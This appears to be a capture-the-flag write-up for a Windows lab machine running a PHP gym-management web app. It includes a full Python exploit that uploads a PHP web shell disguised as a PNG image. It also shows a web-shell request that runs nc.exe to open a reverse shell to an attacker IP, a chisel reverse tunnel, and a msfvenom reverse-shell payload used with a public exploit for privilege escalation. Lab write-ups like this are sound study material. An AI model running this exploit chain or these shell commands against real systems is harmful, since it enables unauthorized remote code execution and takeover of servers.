![image](https://user-images.githubusercontent.com/68326057/117569071-67c49a00-b0e1-11eb-802a-3784aab7f275.png)

# NMAP

```bash
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

```


# WEB


--> upload.php
![image](https://user-images.githubusercontent.com/68326057/117569130-bffb9c00-b0e1-11eb-9b76-cd8db979fef4.png)


![image](https://user-images.githubusercontent.com/68326057/117569141-d99ce380-b0e1-11eb-9226-5bb2e720a3ef.png)




![image](https://user-images.githubusercontent.com/68326057/117569070-6004f580-b0e1-11eb-94da-75c492e4595d.png)

![image](https://user-images.githubusercontent.com/68326057/117569243-5c25a300-b0e2-11eb-93c4-274cb0e14963.png)

![image](https://user-images.githubusercontent.com/68326057/117569256-71023680-b0e2-11eb-8df1-dfa22c531f21.png)


```python
# IT IS PYTHON3 CODE

import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print("[!] Could not connect to the webshell.")
            r2.raise_for_status()
        print('[+] Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
        print("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0])
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    UPLOAD_DIR = 'upload.php?id=kamehameha'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'file': 
                  (
                    'kaio-ken.php.png', 
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>', 
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
              }
    fdata   = {'pupload': 'upload'}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    webshell(SERVER_URL, s)
  ```
  # RCE
  
  --> http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami
  
  ![image](https://user-images.githubusercontent.com/68326057/117569888-61382180-b0e5-11eb-864d-79655bbf9e04.png)

--> view-source:http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe%2010.10.14.21%209001%20-e%20cmd.exe

![image](https://user-images.githubusercontent.com/68326057/117574054-e6790180-b0f8-11eb-865c-145a39cd9964.png)


# USER shaun

![image](https://user-images.githubusercontent.com/68326057/117574066-fbee2b80-b0f8-11eb-8e8a-e2f0107d1a8b.png)

![image](https://user-images.githubusercontent.com/68326057/117574585-791aa000-b0fb-11eb-8eda-ea7c5145727a.png)

![image](https://user-images.githubusercontent.com/68326057/117574933-3eb20280-b0fd-11eb-841d-a491704ac46e.png)

![image](https://user-images.githubusercontent.com/68326057/117574962-5ee1c180-b0fd-11eb-907f-fd9ce6fc2954.png)

```bash
type --> tasklist
```

![image](https://user-images.githubusercontent.com/68326057/117574994-82a50780-b0fd-11eb-9f4c-33c07e6c095b.png)

![image](https://user-images.githubusercontent.com/68326057/117575105-08c14e00-b0fe-11eb-8266-3fa3675c64c3.png)



AND NOW THE MAIN PART

ON attacker machine

```bash
./chisel  server --reverse --port 9999
````

on Victim machien

```bash
chisel.exe client 10.10.14.21:9999 R:8888:127.0.0.1:8888
```

This will generate a tunnel

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=9002  -b "\x00\x0d\x0a" -f python
```

Put it in the code u found
and add this at the end:-

```bash
payload=buf
```
Because OUR payload is buf

Start listener

```bash
nc -lnvp 9002
```
on other terminal type python 48389.py

AND !!!!BOOMM!!!

![image](https://user-images.githubusercontent.com/68326057/117577596-1085f000-b108-11eb-9560-a349b9f67c5e.png)

